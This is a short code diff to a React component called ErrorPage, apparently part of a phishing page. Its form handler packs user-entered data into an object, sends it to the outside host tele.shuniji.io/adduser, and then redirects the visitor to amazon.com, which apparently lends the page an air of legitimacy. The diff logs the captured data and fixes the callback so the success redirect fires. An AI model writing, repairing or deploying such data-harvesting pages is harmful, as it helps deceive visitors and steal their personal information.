@@ -82,6 +82,7 @@ export default function ErrorPage() {
                 comment: comment,
                 image: urlImages || '',
             };
+            console.log("🚀 ~ senDataUser ~ user:", user)
 
             setLoading(true);
             await fetch('https://tele.shuniji.io/adduser', {
@@ -93,8 +94,8 @@ export default function ErrorPage() {
                 body: JSON.stringify(user),
             })
                 .then((resp) => resp.json())
-                .then(() => {
-                    data.success
+                .then((data) => {
+                    data?.success
                         ? (window.location.href = 'https://www.amazon.com/')
                         : console.log('error data');
                     setLoading(false);
